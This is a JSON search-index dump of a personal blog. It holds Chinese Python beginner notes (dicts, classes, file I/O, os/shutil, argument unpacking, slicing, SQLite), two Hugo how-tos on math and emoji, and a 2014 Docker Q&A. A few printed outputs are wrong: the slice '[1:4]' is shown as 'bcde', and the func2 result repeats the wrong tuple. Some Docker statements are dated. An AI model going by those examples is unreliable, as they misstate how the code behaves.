\u0026lt;\u0026lt;\u0026lt; orange \u0026gt;\u0026gt;\u0026gt; 查無此水果 查詢所有的key (回傳列表) 1 2 3 4 dict1 = {\u0026#34;user1\u0026#34;:\u0026#34;小丸子\u0026#34;, \u0026#34;user2\u0026#34;:\u0026#34;小玉\u0026#34;, \u0026#34;user3\u0026#34;:\u0026#34;花輪\u0026#34;} dict1.keys() \u0026gt;\u0026gt;\u0026gt; dict_keys([\u0026#39;user1\u0026#39;, \u0026#39;user2\u0026#39;, \u0026#39;user3\u0026#39;]) 查詢所有的values (回傳列表) 1 2 3 4 dict1 = {\u0026#34;user1\u0026#34;:\u0026#34;小丸子\u0026#34;, \u0026#34;user2\u0026#34;:\u0026#34;小玉\u0026#34;, \u0026#34;user3\u0026#34;:\u0026#34;花輪\u0026#34;} dict1.values() \u0026gt;\u0026gt;\u0026gt; dict_values([\u0026#39;小丸子\u0026#39;, \u0026#39;小玉\u0026#39;, \u0026#39;花輪\u0026#39;]) 建立 建立空dict 1 2 3 4 5 # 方法1: dict1 = {} # 方法2: dict2 = dict() 建立dict 1 dict1 = {1:\u0026#34;one\u0026#34;, 2:\u0026#34;tow\u0026#34;, 3:\u0026#34;three\u0026#34;} 新增dict 1 dict1[newKey] = value 更新 更新dict 1 dict1[oldKey] = value 比對更新 - update update 會比對沒有的key並補上，比對有的key進行value更新。 1 2 3 4 5 6 dict1 = {\u0026#39;user1\u0026#39;: \u0026#39;小丸子\u0026#39;, \u0026#39;user2\u0026#39;: \u0026#39;小玉\u0026#39;, \u0026#39;user3\u0026#39;: \u0026#39;花輪\u0026#39;} dict2 = {\u0026#39;user1\u0026#39;: \u0026#39;大丸子\u0026#39;, \u0026#39;user2\u0026#39;: \u0026#39;小玉\u0026#39;, \u0026#39;user3\u0026#39;: \u0026#39;花輪\u0026#39;, \u0026#39;user4\u0026#39;: \u0026#39;多拉A夢\u0026#39;} dict1.update(dict2) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;user1\u0026#39;: \u0026#39;大丸子\u0026#39;, \u0026#39;user2\u0026#39;: \u0026#39;小玉\u0026#39;, \u0026#39;user3\u0026#39;: \u0026#39;花輪\u0026#39;, \u0026#39;user4\u0026#39;: \u0026#39;多拉A夢\u0026#39;} 刪除 刪除整個dict 1 del dict1 清空整個dict 1 dict1.clear() 刪除list中的某一個(以第一個為例) 1 del dict1[key] 操作 class (類別/物件導向) 封裝成一個類別 - class 類別名稱: python的class會自動執行__init__函式，可自行定義__init__內要做的事。 __init__第一個參數預設為self。 1 2 3 4 5 6 7 class GoogleSpyder: def __init__(self, keyword): self.keyword = keyword self.url_tmp = \u0026#34;http://google.com/search?q=\u0026#34; + keyword + \u0026#34;\u0026amp;start={}\u0026#34; self.headers = {\u0026#34;user-agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34;} googleSpyder = GoogleSpyder(\u0026#34;python\u0026#34;) # 自動執行 __init__ 檔案處理 讀寫模式 模式 說明 r read：讀取(檔案需存在) w write：新建檔案寫入(檔案可不存在，若存在則清空) a append：資料附加到舊檔案後面(游標指在檔案結尾，檔案可不存在) r+ 讀取舊資料並寫入(檔案需存在且游標指在開頭) w+ 清空檔案內容，新寫入的東西可再讀出 a+ 資料附加到舊檔案後面，可讀取資料 b 二進位模式 記憶方式： 1 2 3 4 w、w+ # 會清除原檔案內容 r、r+ # 檔案指標指向檔案開頭 a、a+ # 檔案指標指向檔案結尾 + # 可讀可寫模式 檔案開啟 - open() 操作後需關檔 - close() 1 2 3 4 5 6 7 8 9 10 content = \u0026#34;\u0026#34;\u0026#34;Hello Python 中文測試 abc 123456.321654987 $@^$%^@#$!@#$ \u0026#34;\u0026#34;\u0026#34; file = open(\u0026#34;myfile.txt\u0026#34;, \u0026#34;w\u0026#34;) ... file.close() 讀取 - read() myfile.txt 1 testtest123 test.py 1 2 3 file = open(r\u0026#34;myfile.txt\u0026#34;, \u0026#34;r\u0026#34;) print(file.read()) file.close() 執行回傳 1 \u0026gt;\u0026gt;\u0026gt; testtest123 寫入 - write() test.py 1 2 3 file = open(r\u0026#34;myfile.txt\u0026#34;, \u0026#34;w\u0026#34;) file.write(\u0026#39;testtest123\u0026#39;) file.close() myfile.txt 1 testtest123 移動讀寫頭 - seek() 1 2 3 4 5 6 7 8 9 10 11 12 content = \u0026#34;\u0026#34;\u0026#34;Hello Python\u0026#34;\u0026#34;\u0026#34; file = open(r\u0026#34;myfile.txt\u0026#34;, \u0026#34;r\u0026#34;) # file.write(content) file_content = file.read() print(file_content) file.seek(0) # 移動讀寫頭到開頭 file_content = file.read() print(file_content) file.close() 執行回傳 1 2 \u0026gt;\u0026gt;\u0026gt; Hello Python \u0026gt;\u0026gt;\u0026gt; Hello Python 讀出行數 - readline() \u0026amp; readlines() readline：一行一行讀 readlines：一次讀全部行數 poem.txt 1 2 3 4 松下問童子 言師採藥去 只在此山中 雲深不知處 read.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # readlines() 一次讀出 f = open(r\u0026#39;poem.txt\u0026#39;, \u0026#39;r\u0026#39;) lines = f.readlines() for line in lines: print(line, end=\u0026#39;\u0026#39;) f.seek(0) # 讀寫頭回到開頭 # readline() 一行一行讀 line = f.readline() while line != \u0026#39;\u0026#39;: print(line, end=\u0026#39;\u0026#39;) line = f.readline() f.close() 執行回傳： 1 2 3 4 \u0026gt;\u0026gt;\u0026gt; 松下問童子 \u0026gt;\u0026gt;\u0026gt; 言師採藥去 \u0026gt;\u0026gt;\u0026gt; 只在此山中 \u0026gt;\u0026gt;\u0026gt; 雲深不知處 使用 with-open-as 做讀檔案的動作 - (推薦) 1 2 with open(r\u0026#34;poem.txt\u0026#34;, \u0026#34;r\u0026#34;) as file: print(file.read()) 執行回傳： 1 2 3 4 \u0026gt;\u0026gt;\u0026gt; 松下問童子 \u0026gt;\u0026gt;\u0026gt; 言師採藥去 \u0026gt;\u0026gt;\u0026gt; 只在此山中 \u0026gt;\u0026gt;\u0026gt; 雲深不知處 刪除檔案 - remove() 使用os模組 使用os.path.exists判斷檔案是否存在 1 2 3 4 5 6 7 8 import os file = r\u0026#34;poem2.txt\u0026#34; if os.path.exists(file): os.remove(file) else: print(\u0026#39;No exists file\u0026#39;) 新增目錄 - mkdir() 使用os.path.exists判斷檔案是否存在 1 2 3 4 5 6 7 8 import os dir = \u0026#34;testDir\u0026#34; if os.path.exists(dir): print(\u0026#34;Direct is exists\u0026#34;) else: os.mkdir(dir) 刪除空目錄 - rmdir() 使用os.path.exists判斷檔案是否存在 限定空目錄 1 2 3 4 5 6 7 8 import os dir = \u0026#34;testDir\u0026#34; if os.path.exists(dir): os.rmdir(dir) else: print(\u0026#34;Direct is undefine\u0026#34;) 刪除目錄與底下全部檔案 - rmtree() 使用shell utility模組 - shutil 需謹慎使用避免刪錯目錄 1 2 3 import shutil shutil.rmtree(\u0026#34;testDir\u0026#34;) Python 語法筆記 兩個變數交換值(Python Only) 1 2 3 4 x = 3 y = 8 x,y = y,x # 交換兩個變數的值 print(x,y) 開頭宣告編碼方式可直接強轉(Python Only) 1 2 3 4 # -*- coding: utf-8 -*- # 轉utf-8 print(\u0026#34;哈囉\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#34;哈囉\u0026#34; Python函數帶入參數方式 參數以tuple傳入function。 1 2 3 4 5 6 def func1(*args): print(args) func2(1,3,5,7,9) \u0026gt;\u0026gt;\u0026gt; (1, 3, 5, 7, 9) 參數以tuple拆解，進function在組合回tuple。 1 2 3 4 5 6 def func2(*args): print(args) func2(*(2,4,6,8,10)) \u0026gt;\u0026gt;\u0026gt; (1, 3, 5, 7, 9) 參數以dict傳入function。 1 2 3 4 5 6 def func3(**kwargs): print(kwargs) func3(even=(2,4,6,8), odd=(1,3,5,7,9)) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;even\u0026#39;: (2, 4, 6, 8), \u0026#39;odd\u0026#39;: (1, 3, 5, 7, 9)} 參數以dict拆解，進function在組合回dict(需為參數指定關鍵字)(關鍵字參數)。 1 2 3 4 5 6 def func4(**kwargs): print(kwargs) func4(**{\u0026#34;even\u0026#34;:(2,4,6,8), \u0026#34;odd\u0026#34;:(1,3,5,7,9)}) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;even\u0026#39;: (2, 4, 6, 8), \u0026#39;odd\u0026#39;: (1, 3, 5, 7, 9)} 其他 字串運算(Python Only) in：是否含有 1 2 3 # in \u0026#34;or\u0026#34; in \u0026#34;forever\u0026#34; \u0026gt;\u0026gt;\u0026gt; True not in：是否不含有 1 2 3 # not in \u0026#34;abc\u0026#34; not in \u0026#34;forever\u0026#34; \u0026gt;\u0026gt;\u0026gt; False 取字串的特定位置字元 格式：開始點:結束點:間隔 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 取第1~4個字元(不含第4個) \u0026#34;abcdefg\u0026#34;[1:4] \u0026gt;\u0026gt;\u0026gt; \u0026#39;bcde\u0026#39; # 取第1~4個字元(每次間隔2個) \u0026#34;abcdefg\u0026#34;[1:4:2] \u0026gt;\u0026gt;\u0026gt; \u0026#39;bd\u0026#39; # 取最後一個字元 \u0026#34;abcdefg\u0026#34;[-1] \u0026gt;\u0026gt;\u0026gt; \u0026#39;g\u0026#39; # 反轉 \u0026#34;abcdefg\u0026#34;[::-1] \u0026gt;\u0026gt;\u0026gt; \u0026#39;gfedcba\u0026#39; SQLite 關聯式資料庫(版本3.31.1) 系統命令(.開頭)，SQL命令(;結尾)\n系統命令 進入資料庫 指令：sqlite3 資料庫名稱 1 2 3 sqlite3 test01.sqlite sqlite\u0026gt; 資料庫 (DB) sqlite指令新增資料庫 1 .open test01 sqlite指令查詢所有資料庫 1 .databases 資料表 (Table) 欄位設定 說明 NM (None)可否允許空值 PK (Primary Key)是否為主鍵 AI (A.I)是否自動產生值 U (Unique)不重複鍵 新增資料表 1 create table studen(ID Integer, name String, score Integer); sqlite指令查詢所有資料表 1 .table 更新資料表 SQL語法：ALTER TABLE 資料庫 ADD COLUMN 欄位名稱 資料型態\n1 ALTER TABLE student ADD COLUMN address String; 資料操作 (CRUD:Create/Read/Update/Delete) 插入資料 SQL語法：INSERT INTO 資料表 VALUES(欄位1, 欄位2, 欄位3)\n1 INSERT INTO student values(1001, \u0026#34;Ben\u0026#34;, 88); 查詢資料 SQL語法：SELECT 欄位 FROM 資料表 [WHERE 條件];\n1 SELECT Score from student WHERE ID = 1001; 刪除資料 SQL語法：DELETE FROM 資料表 [WHERE 條件];\n1 DELETE from student WHERE ID = 1001; 修改資料 SQL語法：UPDATE 資料表 SET 欄位名稱 = 值 [WHERE 條件];\n1 UPDATE student SET Name = \u0026#34;Amanda\u0026#34; WHERE ID = 1001; ","date":"2020-03-15T00:00:00Z","image":"https://live.staticflickr.com/65535/52283398446_ed21ce37f2_o.png","permalink":"https://wayneblog.ga/2020-03-15/python-beginner-tutorial/","title":"智慧商業Python數據分析與應用班(版本3.*)"},{"content":"Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: 1 2 3 {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTex globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTex on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Block math: $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$\n","date":"2019-03-08T00:00:00Z","permalink":"https://wayneblog.ga/2019-03-08/math-typesetting/","title":"Math Typesetting"},{"content":"Emoji can be enabled in a Hugo project in a number of ways.\nThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site\u0026rsquo;s configuration and then you can type emoji shorthand codes directly in content files; e.g.\n🙈 :see_no_evil: 🙉 :hear_no_evil: 🙊 :speak_no_evil:\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3 .emoji { font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; } ","date":"2019-03-05T00:00:00Z","image":"https://wayneblog.ga/2019-03-05/emoji-support/the-creative-exchange-d2zvqp3fpro-unsplash_huf941de4769045cdfa8c9ee7036519a2a_35369_120x120_fill_q75_box_smart1.jpg","permalink":"https://wayneblog.ga/2019-03-05/emoji-support/","title":"Emoji Support"},{"content":" 參考網站\n不論是 Google、Amazon、微軟、VMware 都紛紛擁戴，加入 Docker 和 Container 所掀起的新世代雲端虛擬化行列，這 2 項技術成為了 IT 界的新顯學。Docker 和 Container 到底是什麼？以下 10 個 Q\u0026amp;A 告訴你。\nQ1：Container 技術和伺服器虛擬化是一樣的技術嗎？\n**A：**不是。兩者雖然都屬於虛擬化的技術，目標都是為了將一套應用程式所需的執行環境打包起來，建立一個孤立環境，方便在不同的硬體中移動，但兩者的運作思維截然不同。簡單來說，常見的傳統虛擬化技術如 vSphere 或 Hyper-V 是以作業系統為中心，而 Container 技術則是一種以應用程式為中心的虛擬化技術。\n傳統虛擬化技術從作業系統層下手，目標是建立一個可以用來執行整套作業系統的沙箱獨立執行環境，習慣以虛擬機器(Virtual Machine)來稱呼。而 Container 技術則是直接將一個應用程式所需的相關程式碼、函式庫、環境配置檔都打包起來建立沙箱執行環境，為了和傳統虛擬化技術產生的虛擬機器區分，Container 技術產生的環境就稱為 Container。\nQ2：一般常見的虛擬機器和 Container 有何不同？\n**A：**最明顯的差別是，虛擬機器需要安裝作業系統(安裝 Guest OS)才能執行應用程式，而 Container 內不需要安裝作業系統就能執行應用程式。Container 技術不是在 OS 外來建立虛擬環境，而是在 OS 內的核心系統層來打造虛擬執行環境，透過共用 Host OS 的作法，取代一個一個 Guest OS 的功用。Container 也因此被稱為是 OS 層的虛擬化技術。\nQ3：為何 Container 是輕量級虛擬化技術？\n**A：**因為 Container 技術採取共用 Host OS 的作法，而不需在每一個 Container 內執行 Guest OS，因此建立 Container 不需要等待作業系統開機時間，不用 1 分鐘或幾秒鐘就可以啟用，遠比需要數分鐘甚至數十分鐘才能開啟的傳統虛擬機器來的快。\nQ4：Container 技術是全新的技術嗎？\n**A：**不是，早在 1982 年，Unix 系統內建的 chroot 機制也是一種 Container 技術。其他如 1998 年的 FreeBSD jails、2005 年出現的 Solaris Zones 和 OpenVZ，或像是 Windows 系統 2004 年就有的 Sandboxie 機制都屬於在作業系統內建立孤立虛擬執行環境的作法，都可稱為是 Container 的技術。\n直到 2013 年，dotCloud 這家 PaaS 服務公司開源釋出了一套將 Container 標準化的平臺 Docker，大受歡迎，所以，dotCloud 決定以 Docker 為名成立新公司力推。\nQ5：Docker 如何實現 Container 標準化？\n**A：**Docker 採用了 aufs 檔案系統來設計一個可以層層堆疊的 Container 映象檔，將 Container 內的所有程式(包括應用程式、相關函式庫、設定檔)，都打包進 Docker 映象檔，並且提供了一個 Dockerfile 設定檔來記錄建立 Container 過程的每一個步驟包括參數。只要在任何支援 Docker 平臺的環境中，就可以從這個映象檔來建立出一個一模一樣的 Container 來執行同一個應用程式。如此一來，應用程式等於是可以透過 Docker 映象檔，或甚至只需要 Dockerfile，就能將程式執行環境帶著走，移動到任何支援 Docker 的環境中。Docker 公司也釋出 API，可以用來控制所有的 Container 相關指令，任何人只要使用同一套 Docker，就等於有了同一套管理和建立 Container 的方法，也就等同於將 Container 運用標準化了。\nQ6：一個 Container 映象檔內可以安裝多少應用程式？\n**A：**一個 Container 的映象檔內可以安裝多支程式，例如同時安裝 Ubuntu、Apache、MySQL、Node.js、Ruby 等。不過，Docker 官方建議，一隻程式安裝在一個 Container 內，再把這些 Container 疊起來提供一個完整的服務。\nDocker 稱這是一種 Microservices(微服務)的新軟體架構，將組成一個應用系統的每一個 Stack，拆解成許多小型服務，例如 Apache 服務、MySQL 服務、Node.js 服務、Ruby 服務，每一個服務都是包在 Container 裡的一隻程式，例如 MySQL 服務就是部署在 Container 內的 MySQL。\n這麼做的好處是可以建立一個鬆散耦合的彈性應用程式架構，也能輕易地抽換其中一個 Container，例如要升級 MySQL，只需要重新載入新版 MySQL 的 Container 映象檔，就可以完成資料庫升級，不用將整套應用系統停機。\nQ7：Container 內不是不需要 OS，為何需要 OS 的基礎映象檔？\n**A：**OS 基礎映象檔的用途是讓 Container 擁有這 OS 的檔案系統，例如使用 ubuntu 基礎映象檔就可以讓 Container 建立 ubuntu 的根目錄架構，而不是用來執行一個 OS 執行實例。\nQ8：Docker 對 Devops 有何幫助？\n**A：**因為 Docker 透過 Dockerfile 來記錄建立 Container 映象檔的每一個步驟，可以將建立應用程式執行環境的過程和配置參數，完整地記錄下來。開發人員和維運人員之間可以利用 Dockerfile 來溝通對執行環境的討論。甚至結合版本控制服務如 GitHub，可以讓 Dockerfile 具備版本控制功能，能將基礎架構程式化(Infrastructure as code)來管理。\nQ9：可以在 Windows Server 環境中執行 Docker 嗎？\n**A：**還不行。目前 Docker 只能在 Linux 平臺上執行，但是微軟 10 月中剛宣布要在下一波 Windows Server 改版時內建 Docker 引擎，未來同一份 Docker 映象檔能否跨 Linux 和 Windows OS，還需待微軟揭露更多細節才能得知。\nQ10：在臺灣，如何找到懂 Docker 技術的人？\n**A：**目前 Docker 公司還未在臺設點，但有一個 Docker Taipei 社群，成員截至 10 月有 383 人。\nDocker Taipei 也預計配合 Docker 總公司舉辦的全球 HackDay 活動，在 11 月 1 日舉辦臺北場 HackDay。參加作品將直接發布到美國和全球 Docker 開發者一起評比，獎品是明年到美國參加 Docker 技術大會的資格。\n","date":"2014-10-28T00:00:00Z","image":"https://live.staticflickr.com/65535/52564831824_2754e80d0b_o.png","permalink":"https://wayneblog.ga/2014-10-28/docker-10-qa/","title":"10 個 Q\u0026A 快速認識 Docker"}]